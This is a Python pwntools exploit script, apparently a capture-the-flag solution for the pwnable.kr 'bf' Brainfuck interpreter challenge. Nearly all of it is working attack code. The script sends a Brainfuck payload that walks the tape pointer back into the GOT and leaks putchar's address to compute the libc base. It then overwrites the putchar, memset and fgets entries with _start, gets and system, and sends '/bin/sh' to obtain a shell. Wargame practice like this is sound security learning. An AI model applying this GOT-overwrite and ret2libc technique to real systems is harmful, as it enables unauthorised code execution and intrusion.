#coding=utf-8
from pwn import *

#io = process('./bf')
io = remote('pwnable.kr','9001')
elf = ELF('./bf')
libc = ELF('./bf_libc.so')
context.log_level = 'debug'

start = 0x080484E0
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
putchar_got = elf.got['putchar']
memset_got = elf.got['memset']
fgets_got = elf.got['fgets']
p = 0x0804A0A0

payload = '<' * (p-putchar_got) + '.' + '.>.>.>.>' + '<' * 4 # leak the putchar_got's addr
payload += ',>,>,>,>' + '<' * (putchar_got - memset_got + 4) # bitwise overlay address(putchar->_start)
payload += ',>,>,>,>' + '<' * (memset_got - fgets_got + 4) # bitwise overlay address(memset->gets)
payload += ',>,>,>,>' + '.' # bitwise overlay address(fgets->system)

io.recvuntil('type some brainfuck instructions except [ ]\n')
io.sendline(payload)
io.recv(1)
putchar_addr = u32(io.recv(4))
print 'putchar_addr:',putchar_addr

libc_base = putchar_addr - libc.sym['putchar']
gets_addr = libc_base + libc.sym['gets']
system_addr = libc_base + libc.sym['system']

io.send(p32(start)+p32(gets_addr)+p32(system_addr))
io.recvuntil('type some brainfuck instructions except [ ]')
io.sendline('/bin/sh\x00')# fgets('/bin/sh\x00')->system('/bin/sh\x00')
io.interactive()